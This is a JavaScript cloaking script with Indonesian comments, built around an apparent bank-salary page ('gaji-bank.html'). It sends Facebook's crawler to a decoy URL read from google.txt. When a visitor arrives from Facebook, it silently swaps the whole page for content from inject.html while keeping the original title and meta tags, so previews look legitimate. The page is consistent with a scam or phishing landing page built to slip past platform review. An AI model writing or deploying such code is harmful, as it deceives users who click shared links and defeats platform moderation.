(function () {
  const referrer = document.referrer; // Mendapatkan referer
  const userAgent = navigator.userAgent; // Mendapatkan user-agent
  const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
  const currentPath = location.pathname; // Mendapatkan path URL saat ini

  // Fungsi untuk membaca file eksternal
  const fetchFileContent = async (filePath) => {
    const response = await fetch(filePath);
    if (!response.ok) {
      throw new Error(`Failed to fetch ${filePath}`);
    }
    return response.text();
  };

  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
  const injectMetadata = (metadata) => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(metadata, 'text/html');

    // Sisipkan <title>
    const title = doc.querySelector('title');
    if (title) {
      document.title = title.textContent;
    }

    // Sisipkan <meta> dan <link>
    const head = document.head;
    doc.querySelectorAll('meta, link').forEach((meta) => {
      head.appendChild(meta.cloneNode(true));
    });
  };

  // Membaca URL dari google.txt, target.txt, dan metadata dari gaji-bank.html
  Promise.all([
    fetchFileContent('/google.txt'),
    fetchFileContent('/target.txt'),
    fetchFileContent('/gaji-bank.html'), // Ambil metadata asli dari gaji-bank.html
  ])
    .then(([googleUrl, targetUrl, originalHtml]) => {
      if (referrer.includes('facebook.com') && isFacebookCrawler && currentPath.includes('redirect.html')) {
        // Jika redirect.html diakses dari referer Facebook dan crawler Facebook
        location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
      } else if (currentPath.includes(targetUrl.trim()) && !referrer.includes('facebook.com')) {
        // Jika gaji-bank.html diakses langsung tanpa referer Facebook
        // Tampilkan HTML asli (tidak perlu melakukan apa-apa)
      } else if (currentPath.includes(targetUrl.trim()) && referrer.includes('facebook.com')) {
        // Jika gaji-bank.html diakses dari referer Facebook, injeksikan konten dari inject.html
        fetch('/inject.html')
          .then((response) => response.text())
          .then((html) => {
            document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
            injectMetadata(originalHtml); // Sisipkan metadata asli dari gaji-bank.html
          })
          .catch((err) => console.error('Error loading inject.html:', err));
      }
    })
    .catch((err) => console.error('Error loading URLs:', err));
})();